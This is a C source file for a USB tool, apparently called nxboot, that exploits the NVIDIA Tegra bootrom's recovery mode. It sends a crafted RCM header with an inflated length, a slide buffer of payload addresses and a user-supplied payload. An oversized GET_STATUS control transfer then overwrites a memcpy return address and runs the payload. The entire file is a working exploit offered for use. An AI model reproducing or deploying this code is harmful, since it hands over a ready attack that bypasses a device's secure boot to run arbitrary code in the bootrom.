#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

#include "usb.h"
#include "libusb.h"

#define ALIGN(x,a) __ALIGN_MASK(x,(typeof(x))(a)-1)
#define __ALIGN_MASK(x,mask) (((x)+(mask))&~(mask))

#define BUF0 0x40005000
#define BUF1 0x40009000
#define STACK_BOTTOM 0x4000D000
#define STACK_TOP 0x4000FFFF
#define SLIDE 0x40010000
#define SLIDE_SIZE 0x10000
#define PAYLOAD 0x40020000
#define PAYLOAD_SIZE 0x20000

#ifdef HAVE_USB_PORT_MATCH
	bool match_port = false;
	uint8_t match_bus;
	uint8_t match_ports[PORT_MATCH_MAX_PORTS];
	int match_ports_len;
#endif

//sizeof(rcm_msg_t) = 0x2A8
typedef struct _rcm_msg_t
{
	uint32_t len_insecure;
	uint8_t unk0[0x24];
	uint8_t modulus[0x100];
	struct {
		uint8_t cmac_hash[0x10];
		uint8_t rsa_pss_sig[0x100];
	} object_sig;
	uint8_t reserved[0x10];
	uint32_t ecid[4];
	uint32_t opcode;
	uint32_t len_secure;
	uint32_t payload_len;
	uint32_t rcm_version;
	uint8_t args[0x30];
	uint8_t padding[0x10];
} __attribute__((packed)) rcm_msg_t;

bool exploit(usb_device_t *usb, uint8_t *payload, uint32_t plsize, uint32_t thumb)
{
	if (plsize > PAYLOAD_SIZE - 0x120)
		return false;

	//Read uid.
	uint64_t uid[2] = { 0, 0 };
	int actual_len;
	if (usb_read(usb, (uint8_t *)uid, 0x10, &actual_len))
	{
		printf("[x] Could not read uid.\n");
		return false;
	}
	printf("[+] uid: 0x%016llX%016llX\n", uid[0], uid[1]);

	//Setup required message fields.
	rcm_msg_t msg = { 0 };
	//Add a few bytes extra to stall the bootrom later.
	msg.len_insecure = sizeof(rcm_msg_t) + SLIDE_SIZE + plsize + 0x100;
	//The bootrom expects that 'len_insecure & 0xF == 8'.
	msg.len_insecure = ALIGN(msg.len_insecure, 0x10) + 8;
	printf("[+] Insecure length = 0x%08X\n", msg.len_insecure);

	//Send message header.
	if (usb_write(usb, (uint8_t *)&msg, sizeof(rcm_msg_t)))
	{
		printf("[x] Failed to send rcm message header.\n");
		return false;
	}

	//Setup slide buffer.
	uint8_t slide[SLIDE_SIZE];
	for (uint32_t i = 0; i < SLIDE_SIZE; i += 4)
		*(uint32_t *)(slide + i) = PAYLOAD | (thumb & 1);

	//Send slide buffer.
	if (usb_write(usb, slide, SLIDE_SIZE))
	{
		printf("[x] Failed to send slide buffer.\n");
		return false;
	}

	//Send payload.
	if (usb_write(usb, payload, plsize))
	{
		printf("[x] Failed to send payload.\n");
		return false;
	}

	//At this point the RCM logic is trying to read the final few bytes.
	//Instead we will issue an interface GET_STATUS control transfer which
	//overwrites a memcpy return address and causes our payload to execute.
	//0x6000 works, 0x8000 crashes.
	#define SIZE 0xF000
	int ret = libusb_control_transfer(usb->handle, LIBUSB_ENDPOINT_IN | LIBUSB_RECIPIENT_INTERFACE, 0x0, 0x0, 0x0, slide, SIZE, 1000);
	if (ret < 0)
		printf("[+] Control transfer failure: %d: %s\n", ret, libusb_error_name(ret));

	/*FILE *fp = fopen("dump.bin", "wb");
	fwrite(slide, 1, SIZE, fp);
	fclose(fp);*/

	return true;
}

int main(int argc, char **argv)
{
	uint16_t devid;
	usb_device_t *usb;

	if (argc != 2)
	{
		//TODO: add an option for ARM vs Thumb mode jump to entrypoint.
		//We might also be able to shave off a few bytes and move
		//the entrypoint to a slightly lower address.
		printf("Usage: nxboot payload\nThe payload will be loaded @ 0x40020000.\n");
		return 1;
	}

	if ((usb = usb_open(USB_VENID_NVIDIA, &devid
		#ifdef HAVE_USB_PORT_MATCH
		, &match_port, &match_bus, match_ports, &match_ports_len
		#endif
	)))
	{
		FILE *fp = fopen(argv[1], "rb");
		if (fp == NULL)
		{
			printf("[x] Could not open '%s'.\n", argv[1]);
			return 1;
		}
		fseek(fp, 0, SEEK_END);
		uint32_t len = ftell(fp);
		fseek(fp, 0, SEEK_SET);
		uint8_t *buf = (uint8_t *)malloc(len);
		fread(buf, 1, len, fp);
		fclose(fp);
		printf("[+] Payload size = 0x%08X\n", len);

		exploit(usb, buf, len, 0);
		usb_close(usb);
	}

	return 0;
}
